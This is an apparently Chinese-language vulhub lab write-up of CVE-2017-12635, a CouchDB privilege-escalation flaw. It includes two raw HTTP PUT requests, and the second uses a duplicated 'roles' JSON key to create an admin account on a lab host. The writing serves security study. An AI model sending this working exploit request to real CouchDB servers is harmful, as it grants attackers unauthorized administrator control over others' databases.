# Couchdb 垂直权限绕过漏洞

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包改包--->用户创建成功--->成功登录

### 0x01漏洞介绍

​			Apache CouchDB是一个开源数据库，专注于易用性和成为"完全拥抱web的数据库"。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。

​			在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。

​			在定义一对键值对时，Eralang解析器将存储两个值；javascript只存储第二个值。但jiffy实现时，getter函数只返回第一个值。

##### 影响版本

```
<1.7.0 && <2.1.1
```

### 0x02漏洞复现

##### **PAYLOAD1:

```
PUT /_users/org.couchdb.user:vulhub HTTP/1.1
Host: your-ip:5984
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 108

{
  "type": "user",
  "name": "vulhub",
  "roles": ["_admin"],
  "password": "vulhub"
}
```

##### **PAYLOAD2:

	PUT /_users/org.couchdb.user:vulhub HTTP/1.1
	Host: your-ip:5984
	Accept: */*
	Accept-Language: en
	User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
	Connection: close
	Content-Type: application/json
	Content-Length: 108
	
	{
	  "type": "user",
	  "name": "vulhub",
	  "roles": ["_admin"],
	  "roles": [],
	  "password": "vulhub"
	}
​			**默认页面**

![Couchdb_垂直权限绕过漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Couchdb_垂直权限绕过漏洞_1.jpg)

​			**首先发送payload1，可见，返回403错误：`{"error":"forbidden","reason":"Only _admin may set roles"}`，只有管理员才能设置Role角色**



​			**发送包含两个roles的数据包，即可绕过限制，成功创建管理员，账户密码均为`vulhub`**

![Couchdb_垂直权限绕过漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Couchdb_垂直权限绕过漏洞_2.jpg)

​			**再次访问`http://your-ip:5984/_utils/`，输入账户密码`vulhub`，可以成功登录**

![Couchdb_垂直权限绕过漏洞_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Couchdb_垂直权限绕过漏洞_3.jpg)

### 0x03参考资料

https://www.cnblogs.com/foe0/p/11375757.html



